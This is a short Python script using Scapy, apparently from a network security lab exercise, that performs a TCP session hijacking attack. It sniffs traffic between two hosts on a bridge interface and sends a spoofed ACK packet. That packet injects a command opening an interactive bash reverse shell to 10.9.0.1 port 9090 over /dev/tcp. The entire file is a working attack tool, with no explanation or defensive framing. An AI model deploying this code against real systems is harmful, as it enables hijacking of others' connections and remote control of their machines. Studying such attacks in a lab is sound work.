#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    # pkt.show()
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
    rst_pkt = ip/tcp/data
    ls(rst_pkt)
    send(rst_pkt, verbose=0)

pkt = sniff(iface="br-e6512860ed72", 
			filter="tcp and net 10.9.0.5 and net 10.9.0.6",
			prn=spoof_pkt)
